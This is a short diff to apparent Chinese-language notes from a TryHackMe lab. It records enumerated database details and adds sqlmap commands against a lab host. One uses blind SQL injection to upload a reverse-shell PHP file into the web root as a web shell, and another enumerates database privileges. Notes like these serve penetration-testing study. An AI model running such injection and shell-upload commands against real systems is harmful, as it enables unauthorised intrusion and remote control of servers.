@@ -269,3 +269,8 @@ available databases [2]:
 >数据表：host 表字段：id,ip
 >用户名：'monitor_read'@'localhost'
 >密码：枚举不出来
+
+
+sqlmap -u "http://10.10.2.131:81/ping?id=1" -p "id"  --batch --dbms=mysql --technique B --file-write /root/tryhackme/reverse_shell.php --file-dest c://www/html/shell.php
+
+sqlmap -u "http://10.10.2.131:81/ping?id=1" -p "id"  --batch --dbms=mysql --technique B --privileges --role
